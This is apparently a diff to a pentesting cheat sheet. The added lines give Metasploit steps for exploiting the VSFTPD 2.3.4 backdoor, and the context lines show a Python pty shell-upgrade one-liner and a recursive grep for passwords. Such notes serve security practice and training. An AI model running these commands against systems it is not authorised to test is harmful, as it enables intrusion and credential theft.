@@ -27,3 +27,14 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 # grep recursif
 grep -ir 'password'
+
+
+#VSFTPD v2.3.4 Backdoor Command Execution  
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show targets
+    ...targets...
+msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
+msf exploit(vsftpd_234_backdoor) > show options
+    ...show and set options...
+msf exploit(vsftpd_234_backdoor) > exploit
+
